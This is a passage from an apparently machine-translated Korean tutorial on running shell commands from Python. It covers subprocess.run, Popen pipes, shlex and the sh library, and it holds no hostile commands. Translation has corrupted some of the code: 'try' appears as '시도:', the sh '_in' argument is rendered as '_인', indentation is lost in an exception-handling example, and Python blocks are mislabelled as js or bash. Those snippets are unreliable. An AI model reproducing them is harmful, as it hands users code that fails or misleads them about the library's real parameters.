...\n```\n\n<div class=\"content-ad\"></div>\n\n문서에서 설명된대로:\n\n대부분의 경우 subprocess.run을 사용하여 kwargs를 전달하여 해당 동작을 변경하는 것이 충분합니다. 예를 들어 shell=True를 사용하면 명령을 단일 문자열로 전달할 수 있고, check=True를 사용하면 종료 코드가 0이 아닌 경우 예외를 throw하고, capture_output=True를 사용하면 stdout 속성을 채울 수 있습니다.\n\nsubprocess.run()은 프로세스를 호출하는 권장되는 방법입니다. 이 모듈에서 다른 (불필요하고 사용되지 않는) 옵션도 있습니다: call, check_call, check_output, getstatusoutput, getoutput. 일반적으로 아래와 같이 run과 Popen만 사용해야 합니다:\n\n```js\nwith subprocess.Popen(['ls', '-la'], stdout=subprocess.PIPE, encoding='utf-8') as process:\n    # process.wait(timeout=5)  # 코드만 반환: 0\n    outs, errs = process.communicate(timeout=5)\n    print(f'Command {process.args}가 {process.returncode} 코드로 종료되었으며 출력: \\n{outs}')\n\n# 파이프\nimport shlex\nls = shlex.split('ls -la')\nawk = shlex.split(\"awk '{print $9}'\")\nls_process = subprocess.Popen(ls, stdout=subprocess.PIPE)\nawk_process = subprocess.Popen(awk, stdin=ls_process.stdout, stdout=subprocess.PIPE, encoding='utf-8')\n\nfor line in awk_process.stdout:\n    print(line.strip())\n    # .\n    # ..\n    # examples.py\n    # ...\n```\n\n<div class=\"content-ad\"></div>\n\n위의 첫 번째 예제는 이전에 소개된 subprocess.run의 Popen 등가물을 보여줍니다. 그러나 run이 제공하는 것보다 더 많은 유연성이 필요할 때만 Popen을 사용해야 합니다. 두 번째 예제에서는 한 명령의 출력을 다른 명령으로 파이핑하는 방법을 볼 수 있습니다. ls -la | awk `'print $9'`를 효과적으로 실행하는 방법입니다. 또한, shlex.split을 사용했는데, 이는 문자열을 토큰의 배열로 분할하는 편리한 함수로, shell=True를 사용하지 않고 Popen이나 run으로 전달할 수 있습니다.\n\nPopen을 사용할 때, 프로세스와 더 많은 상호작용을 위해 terminate(), kill() 및 send_signal()을 추가적으로 사용할 수 있습니다.\n\n이전 예제에서는 실제로 오류 처리를 거의 하지 않았지만, 다른 프로세스를 실행할 때 많은 문제가 발생할 수 있습니다. 간단한 스크립팅의 경우, check=True가 있으면 충분할 것으로 생각됩니다. 이는 호출 프로세스가 0이 아닌 반환 코드를 만나면 CalledProcessError가 발생하므로 프로그램이 빠르고 강하게 실패합니다. timeout 인수도 설정하면 TimeoutExpired 예외도 받을 수 있지만, 일반적으로 subproccess 모듈의 모든 예외는 SubprocessError에서 상속받습니다. 예외를 잡고 싶을 경우에는 SubprocessError를 감시하면 됩니다.\n\n# 올바른 방법\n\n<div class=\"content-ad\"></div>\n\n파이썬의 신조(격언)은 다음과 같습니다:\n\n하지만 지금까지 파이썬의 내장 모듈들로 많은 방법을 보았습니다. 하지만 그 중에 어떤 것이 옳은 것일까요? 내 의견으로는 그 중 하나도 아닙니다.\n\n파이썬의 표준 라이브러리를 좋아하지만, subprocess 모듈이 더 나은 \"배터리\" 중에 하나라고 생각합니다.\n\n만약 파이썬에서 다른 프로세스를 많이 조합하는 상황이라면, sh 라이브러리를 한 번 살펴보는 것을 권장합니다:\n\n<div class=\"content-ad\"></div>\n\n```bash\n# https://pypi.org/project/sh/\n# pip install sh\nimport sh\n\n# $PATH에 있는 어떤 명령어든 실행...\nprint(sh.ls('-la'))\n\nls_cmd = sh.Command('ls')\nprint(ls_cmd('-la'))  # 명시적으로\n# total 36\n# drwxrwxr-x  2 martin martin  4096 apr  8 14:18 .\n# drwxrwxr-x 41 martin martin 20480 apr  7 15:23 ..\n# -rw-rw-r--  1 martin martin    30 apr  8 14:18 examples.py\n\n# 만약 PATH에 명령어가 없다면:\ncustom_cmd = sh.Command('/path/to/my/cmd')\ncustom_cmd('some', 'args')\n\nwith sh.contrib.sudo:\n    # 'sudo'를 사용하여 작업 수행...\n    ...\n```\n\nsh.some_command을 호출하면, sh 라이브러리가 해당 이름의 내장 셸 명령어나 $PATH에 있는 이진 파일을 찾습니다. 그런 명령어를 찾으면 그대로 실행됩니다. 명령어가 $PATH에 없는 경우에는 Command의 인스턴스를 생성하고 그렇게 호출할 수 있습니다. sudo를 사용해야 하는 경우에는 contrib 모듈의 sudo context manager를 사용할 수 있습니다. 너무 간단하고 직관적이죠?\n\n명령어의 결과를 파일에 쓰려면, 함수에 \\_out 인수를 제공하면 됩니다:\n\n```bash\nsh.ip.address(_out='/tmp/ipaddr')\n# 'ip address > /tmp/ipaddr'와 같습니다\n```\n\n<div class=\"content-ad\"></div>\n\n위에는 하위 명령을 호출하는 방법도 보여 줍니다. - 점을 사용하세요.\n\n마지막으로 \\_인 인수를 사용하여 파이프(|)를 사용할 수도 있습니다:\n\n```js\nprint(sh.awk('{print $9}', _인=sh.ls('-la'))\n# \"ls -la | awk '{print $9}'\"과 동일합니다\n\nprint(sh.wc('-l', _인=sh.ls('.', '-1'))\n# \"ls -1 | wc -l\"과 동일합니다\n```\n\n오류 처리에 대해선 ErrorReturnCode 또는 TimeoutException 예외를 감시하면 됩니다:\n\n<div class=\"content-ad\"></div>\n\n\n시도:\nsh.cat('/tmp/doesnt/exist')\nexcept sh.ErrorReturnCode as e:\nprint(f'Command {e.full_cmd} exited with {e.exit_code}') # Command /usr/bin/cat /tmp/doesnt/exist exited with 1\n\ncurl = sh.curl('https://httpbin.org/delay/5', \\_bg=True)\ntry:\ncurl.wait(timeout=3)\nexcept sh.TimeoutException:\nprint(\"Command timed out...\")\ncurl.kill()\n\n\n선택적으로, 만약 프로세스가 시그널에 의해 종료된다면, SignalException을 받게 될 거에요. 특정 시그널을 확인할 수 있는데 예를 들면 SignalException_SIGKILL(또는 \\_SIGTERM, \\_SIGSTOP 등)으로 확인할 수 있어요.\n\n이 라이브러리에는 내장된 로깅 지원도 있어요. 켜기만 하면 되는데요. 다음 코드가 도와줄 거에요:\n\n\nimport logging\n\n# 기본 로깅 켜기:\n\nlogging.basicConfig(level=logging.INFO)\nsh.ls('-la')\n\n# INFO:sh.command:<Command '/usr/bin/ls -la', pid 1631463>: process started\n\n# 로그 레벨 변경:\n\nlogging.getLogger('sh').setLevel(logging.DEBUG)\nsh.ls('-la')\n\n# INFO:sh.command:<Command '/usr/bin/ls -la', pid 1631661>: process started\n\n# DEBUG:sh.command:<Command '/usr/bin/ls -la'>: starting process\n\n# DEBUG:sh.command.process:<Command '/usr/bin/ls -la'>.<Process 1631666 ['/usr/bin/ls', '-la']>: started process\n\n# ...\n\n\n\n<div class=\"content-ad\"></div>\n\n위의 예제들은 대부분의 사용 사례를 다룰 수 있지만, 더 고급/난해한 경우에는 라이브러리 문서의 튜토리얼이나 FAQ를 확인해보세요. 여기에는 추가적인 예제들이 있습니다.\n\n# 마지막으로\n\n다시 강조하고 싶은 점은 항상 시스템 명령어를 사용하는 대신 네이티브 Python 함수를 선호해야 한다는 것입니다. 또한 CLI 명령어를 직접 실행하는 대신 Kubernetes-client나 클라우드 제공업체의 SDK와 같은 서드파티 클라이언트 라이브러리를 사용하는 것을 항상 선호해야 합니다. 내 의견으로는, 쉘 대신 Python에 더 익숙하다면 시스템 관리자 배경에서 오더라도 적용됩니다. 마지막으로, Python은 쉘보다 훨씬 강력하고 견고한 언어이지만, 다른 프로그램/명령어를 너무 많이 연결해야 하는 경우에는 아마도 쉘 스크립트를 작성하는 것이 나을 수도 있습니다.\n\n```js\n연락하고 싶으세요?\n\n이 글은 원본이 martinheinz.dev에 게시되었습니다.\n```\n","ogImage":{"url":"/assets/img/2024-05-23-TheRightWaytoRunShellCommandsFromPython_0.png"},"coverImage":"/assets/img/2024-05-23-TheRightWaytoRunShellCommandsFromPython_0.png","tag":["Tech"],"readingTime":9}],"page":"47","totalPageCount":98,"totalPageGroupCount":5,"lastPageGroup":20,"currentPageGroup":2},"__N_SSG":true}